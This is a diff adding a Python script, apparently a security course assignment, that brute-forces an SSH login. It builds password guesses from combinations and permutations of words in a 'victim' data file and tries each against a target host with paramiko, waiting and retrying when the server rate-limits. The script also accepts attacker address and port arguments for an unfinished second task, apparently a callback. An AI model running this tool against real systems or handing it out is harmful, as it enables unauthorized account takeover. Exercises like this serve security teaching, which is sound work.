@@ -1,0 +1,76 @@
+#!/usr/bin/env python3
+from itertools import combinations, permutations
+from argparse import ArgumentParser
+import colorama
+import paramiko
+import socket
+import time
+
+
+# initialize colorama
+colorama.init()
+
+GREEN = colorama.Fore.GREEN
+RED = colorama.Fore.RED
+RESET = colorama.Fore.RESET
+BLUE = colorama.Fore.BLUE
+
+
+def main():
+    parser = ArgumentParser(description="SSH Bruteforce Python script.")
+    parser.add_argument("victim", help="IP address of victim.")
+    parser.add_argument("attacker_addr", help="IP address of attacker.")
+    parser.add_argument("attacker_port", help="TCP port of attacker.")
+
+    # parse passed arguments
+    args = parser.parse_args()
+    host = args.victim
+    addr = args.attacker_addr
+    port = args.attacker_port
+
+    pwd = task1(host)
+    task2(host, pwd)
+
+
+def task1(host):
+    # read the file
+    data = open('materials/victim.dat').read().splitlines()
+    # brute-force
+    for k in range(1, len(data) + 1):
+        for comb in combinations(data, k):
+            for perm in permutations(comb):
+                if is_ssh_open(host, 'csc2021', ''.join(perm)):
+                    return ''.join(perm)
+
+
+def task2(host, pwd):
+    pass
+
+
+def is_ssh_open(hostname, username, password):
+    # initialize SSH client
+    client = paramiko.SSHClient()
+    # add to know hosts
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    try:
+        client.connect(hostname=hostname, username=username,
+                       password=password, timeout=3)
+    except socket.timeout:
+        # this is when host is unreachable
+        print(f"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}")
+        return False
+    except paramiko.AuthenticationException:
+        print(f"[!] Invalid credentials for {username}:{password}")
+        return False
+    except paramiko.SSHException:
+        print(f"{BLUE}[*] Quota exceeded, retrying with delay...{RESET}")
+        time.sleep(10)
+        return is_ssh_open(hostname, username, password)
+    else:
+        # connection was established successfully
+        print(f"{GREEN}[+] Found combo: {username}:{password}{RESET}")
+        return True
+
+
+if __name__ == "__main__":
+    main()
